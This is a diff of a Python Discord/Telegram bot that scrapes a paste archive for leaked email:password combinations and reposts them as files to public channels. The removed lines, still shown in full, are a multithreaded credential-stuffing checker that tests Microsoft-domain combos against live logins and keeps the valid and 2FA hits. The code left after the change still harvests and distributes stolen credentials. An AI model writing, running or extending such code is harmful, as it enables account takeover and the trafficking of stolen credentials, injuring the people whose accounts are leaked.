@@ -15,13 +15,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 import aiohttp
-import concurrent.futures
-from mailhub import MailHub
 
-MS_DOMAINS = {"hotmail.com", "outlook.com", "live.com", "msn.com", "hotmail.co.uk",
-              "hotmail.fr", "hotmail.de", "hotmail.it", "hotmail.es", "outlook.co.uk",
-              "live.co.uk", "live.fr", "live.de"}
-CHECKER_LIMIT = 20000  # max combos before posting partial results
 import discord
 from discord.ext import commands, tasks
 from discord import app_commands
@@ -39,7 +33,6 @@ TELEGRAM_PUBLIC_CHAT2 = os.environ["TELEGRAM_PUBLIC_CHAT2"]
 OWNER_ID           = int(os.environ["OWNER_ID"])
 
 CHECK_INTERVAL   = 30
-CHECKER_THREADS  = 50   # threads for hotmail checker
 PAGES_TO_SCAN    = 5
 ARCHIVE_URL      = "https://pasteview.com/paste-archive"
 SEEN_FILE        = "seen_urls.json"
@@ -128,58 +121,6 @@ def extract_credentials(raw: str) -> list[str]:
             seen.add(line)
             lines.append(line)
     return lines
-
-# ─── CHECKER ─────────────────────────────────────────────────────────────────
-def check_single(combo: str) -> tuple[str, str]:
-    """Check a single email:pass combo. Returns (combo, status)."""
-    try:
-        email, password = combo.split(":", 1)
-        checker = MailHub()
-        for _ in range(3):
-            try:
-                r = checker.loginMICROSOFT(email, password, None)
-                if not r:
-                    return (combo, "INVALID")
-                if r[0] == "ok":
-                    return (combo, "VALID")
-                if r[0] == "nfa":
-                    return (combo, "2FA")
-                if r[0] == "retry":
-                    continue
-                return (combo, "INVALID")
-            except Exception:
-                import time; time.sleep(0.5)
-        return (combo, "INVALID")
-    except Exception:
-        return (combo, "INVALID")
-
-
-async def check_combos(combos: list[str], status_msg=None) -> list[str]:
-    """Run combos through checker in thread pool, return only valid hits.
-    If over CHECKER_LIMIT, checks first CHECKER_LIMIT and posts partial results."""
-    if not combos:
-        return []
-    partial = len(combos) > CHECKER_LIMIT
-    to_check = combos[:CHECKER_LIMIT] if partial else combos
-    log.info(f"Checking {len(to_check)} combos with {CHECKER_THREADS} threads{' (partial)' if partial else ''}...")
-    if status_msg:
-        try:
-            await status_msg.edit(content=f"🔄 Checking {len(to_check)}/{len(combos)} combos{'  (limit reached, posting partial)' if partial else ''}...")
-        except Exception:
-            pass
-    loop = asyncio.get_event_loop()
-    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
-        futures = [loop.run_in_executor(pool, check_single, combo) for combo in to_check]
-        results = await asyncio.gather(*futures)
-    valid = [combo for combo, status in results if status in ("VALID", "2FA")]
-    log.info(f"Checking done — {len(valid)}/{len(to_check)} valid")
-    if status_msg:
-        try:
-            suffix = " (partial — limit reached)" if partial else ""
-            await status_msg.edit(content=f"✅ {len(valid)} valid hits found from {len(to_check)} combos{suffix}")
-        except Exception:
-            pass
-    return valid
 
 
 # ─── TELEGRAM ────────────────────────────────────────────────────────────────
@@ -412,8 +353,6 @@ async def monitor_loop():
                         else:
                             log.info(f"No content extracted from {url}")
 
-                    sorted_zip = None
-                    valid_hits = []
 
                     if combined:
                         # Flatten all creds
@@ -430,32 +369,12 @@ async def monitor_loop():
                         else:
                             label = "content"
 
-                        # Skip checking for mix files
-                        if label == "mix":
-                            log.info("Mix file detected, skipping checker")
-                            valid_hits = all_raw
-                        else:
-                            # Filter to MS domains only before checking
-                            ms_combos    = [c for c in all_raw if ":" in c and c.split(":", 1)[0].split("@")[-1].lower() in MS_DOMAINS]
-                            other_combos = [c for c in all_raw if c not in ms_combos]
-                            log.info(f"Domain filter: {len(ms_combos)} MS / {len(other_combos)} other out of {len(all_raw)}")
-
-                            try:
-                                status_msg = await content_channel.send(f"🔄 Checking {len(ms_combos)} MS combos...")
-                            except Exception:
-                                status_msg = None
-                            valid_hits = await check_combos(ms_combos, status_msg=status_msg)
-
-
-
-                        if not valid_hits:
-                            log.info("No valid hits after checking, skipping post")
-                        else:
-                            combined = ["\n".join(valid_hits)]
+                        valid_hits = all_raw
+                        combined = ["\n".join(valid_hits)]
 
                     if combined:
                         output   = "\n\n".join(combined)
-                        filename = f"{len(valid_hits)} {label.upper()} VALID.txt"
+                        filename = f"{len(valid_hits)} {label.upper()}.txt"
 
                         # Discord — post full file + ZIP (if not mix)
                         if toggles["discord_content"]:
